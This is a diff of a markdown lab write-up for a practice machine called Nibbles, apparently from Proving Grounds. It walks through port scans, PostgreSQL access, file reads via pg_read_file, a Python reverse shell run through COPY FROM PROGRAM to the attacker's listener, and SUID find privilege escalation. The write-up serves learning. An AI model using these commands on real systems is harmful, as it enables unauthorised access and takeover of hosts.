@@ -58,7 +58,8 @@ HOP RTT       ADDRESS
 
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done at Fri Apr 23 21:40:22 2021 -- 1 IP address (1 host up) scanned in 269.14 seconds```
+Nmap done at Fri Apr 23 21:40:22 2021 -- 1 IP address (1 host up) scanned in 269.14 seconds
+```
 
 The initial nmap scan reveals a few services that might give us a way in: FTP, HTTP, PostgreSQL. Initial thoughts:
 
@@ -81,7 +82,8 @@ Name (192.168.160.47:spaceyowie): anonymous
 331 Please specify the password.
 Password:
 530 Login incorrect.
-Login failed.```
+Login failed.
+```
 
 ## Port 80 - HTTP
 
@@ -116,7 +118,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /server-status (Status: 403)
 ===============================================================
 2021/04/23 21:41:39 Finished
-===============================================================```
+===============================================================
+```
 
 ```shell
 ┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
@@ -141,7 +144,8 @@ GENERATED WORDS: 4612
                                                                                                                        
 -----------------
 END_TIME: Fri Apr 23 21:59:00 2021
-DOWNLOADED: 4612 - FOUND: 2```
+DOWNLOADED: 4612 - FOUND: 2
+```
 
 ```shell
 ┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
@@ -164,7 +168,8 @@ DOWNLOADED: 4612 - FOUND: 2```
 + 7915 requests: 0 error(s) and 6 item(s) reported on remote host
 + End Time:           2021-04-23 22:07:36 (GMT10) (1814 seconds)
 ---------------------------------------------------------------------------
-+ 1 host(s) tested```
++ 1 host(s) tested
+```
 
 ## Port 5437 - PostgreSQL
 
@@ -178,7 +183,8 @@ psql (13.2 (Debian 13.2-1), server 11.7 (Debian 11.7-0+deb10u1))
 SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
 Type "help" for help.
 
-postgres=#```
+postgres=#
+```
 
 And we're in! Now let's have a look around the db and enumerate what we can.
 
@@ -213,7 +219,8 @@ postgres=# SELECT usename, passwd FROM pg_shadow;
  usename  |               passwd                
 ----------+-------------------------------------
  postgres | md53175bce1d3201d16594cebf9d7eb3f9d
-(1 row)```
+(1 row)
+```
 
 Looks kind of empty, no additional creds or interesting data. Let's try reading /etc/passwd and /etc/shadow from the host.
 
@@ -237,7 +244,8 @@ postgres=# select pg_read_file('/etc/passwd', 0, 200000);
 (1 row)
 
 postgres=# select pg_read_file('/etc/shadow', 0, 200000);
-ERROR:  could not open file "/etc/shadow" for reading: Permission denied```
+ERROR:  could not open file "/etc/shadow" for reading: Permission denied
+```
 
 It would've been nice to get some hashes, maybe there's some goodies in Wilson's home dir instead.
 
@@ -259,13 +267,15 @@ postgres=# select pg_read_file('/home/wilson/local.txt', 0, 200000);
 ----------------------------------
  83b4e223d796d4e0df0c595e58ace9e6+
  
-(1 row)```
+(1 row)
+```
 
 And there's the user flag, can we do the same with root?
 
 ```shell
 postgres=# select pg_ls_dir('/root');
-ERROR:  could not open directory "/root": Permission denied```
+ERROR:  could not open directory "/root": Permission denied
+```
 
 :(
 
@@ -291,7 +301,8 @@ postgres=# SELECT * FROM foo;
                                   bar                                   
 ------------------------------------------------------------------------
  uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
-(1 row)```
+(1 row)
+```
 
 That works as expected. And if we do it again but instead send a [Python reverse shell one-liner](https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell), and nothing's blocking outbound traffic, it should connect to our netcat listener.
 
@@ -299,13 +310,15 @@ That works as expected. And if we do it again but instead send a [Python reverse
 ┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
 └─$ sudo nc -lnvp 80
 [sudo] password for spaceyowie: 
-listening on [any] 80 ...```
+listening on [any] 80 ...
+```
 
 ```shell
 postgres=# CREATE TABLE foo (bar text);
 CREATE TABLE
 
-postgres=# COPY hax FROM PROGRAM 'python -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.160",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''';```
+postgres=# COPY hax FROM PROGRAM 'python -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.160",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''';
+```
 
 ```shell
 ┌──(spaceyowie@0x1e)-[~/pg/Nibbles]
@@ -316,7 +329,8 @@ connect to [192.168.49.160] from (UNKNOWN) [192.168.160.47] 57510
 $ id
 uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
 $ python -c 'import pty; pty.spawn("/bin/bash");'
-postgres@nibbles:/var/lib/postgresql/11/main$ ```
+postgres@nibbles:/var/lib/postgresql/11/main$
+```
 
 ## Privesc
 
@@ -329,14 +343,16 @@ Now we've got a low priv shell on the target, we can enumerate the system to fin
 postgres@nibbles:/var/lib/postgresql/11/main$ find / -perm -u=s -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 ...snip...
-/usr/bin/find```
+/usr/bin/find
+```
 
 The `find` command has an `-exec` argument that will execute a specified command, and with the suid bit set, the command will also be executed with root privileges. This gives us the ability to not only read the root flag, but also manipulate config files or create new users.
 
 ```shell
 postgres@nibbles:/var/lib/postgresql/11/main$ find PG_VERSION -exec cat /root/proof.txt \;
 find PG_VERSION -exec cat /root/proof.txt \;
-fd8334ae00d76615d69931c449c61301```
+fd8334ae00d76615d69931c449c61301
+```
 
 And there's the root flag :D
 
